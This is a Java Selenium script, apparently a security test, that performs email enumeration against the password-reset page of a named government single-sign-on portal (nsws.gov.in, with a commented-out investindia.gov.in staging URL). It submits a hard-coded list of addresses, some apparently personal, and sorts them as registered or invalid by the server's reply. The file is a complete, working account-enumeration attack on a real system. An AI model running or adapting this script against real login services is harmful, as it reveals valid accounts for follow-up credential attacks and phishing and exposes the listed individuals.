package org.example;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;


public class EmailEnumeration {

    public static void main(String[] args) throws InterruptedException {
        WebDriver driver = new ChromeDriver();
        driver.manage().window().maximize();

        int i;
        String arr1[] = {"testing @gmail.com", "IEC@yopmail.com", "bhatiaverma@yopmail.com", "ravigupta@tothenew.com", "Testing@gmail.com", "Check@yopmail.com", "Test@gmai.com","Mohit@gmail.com","Checking@gmail.com","iec@yopmail.com","admin_shuchita@gmail.com","1prabhanshu@gmail.com"};

        for (i = 0; i <= arr1.length - 1; i++) {
            // driver.get("https://sso-uat-nsws.investindia.gov.in/auth/realms/madhyam/login-actions/reset-credentials?client_id=portal-stage&tab_id=XrK2mBE02Lw");
            driver.get("https://www.ppe.nsws.gov.in/auth/realms/madhyam/login-actions/reset-credentials?client_id=portal-ppe&tab_id=npYtxtvJgqI");
            driver.findElement(By.xpath("//input[@id='username']")).sendKeys(arr1[i]);
            driver.findElement(By.xpath("//button[@id='kc-reset-password-form']")).click();
            Thread.sleep(3000);

            String Message = driver.findElement(By.xpath("//span[@class='server-message'] | //span[@id='input-error-password-change']")).getText();
            System.out.println(Message);


            if (Message.contains("You should receive an email shortly with instructions on resetting your password."))
            {
                   System.out.println(arr1[i]);
            }
            else {
                if (Message.contains("User is Invalid!"))
                {
                    System.out.println(arr1[i]);
                }
                driver.navigate().to("https://www.ppe.nsws.gov.in/auth/realms/madhyam/login-actions/reset-credentials?client_id=portal-ppe&tab_id=npYtxtvJgqI");
                //  driver.navigate().to("https://sso-uat-nsws.investindia.gov.in/auth/realms/madhyam/login-actions/reset-credentials?client_id=portal-stage&tab_id=XrK2mBE02Lw");

            }
        }
    }
}


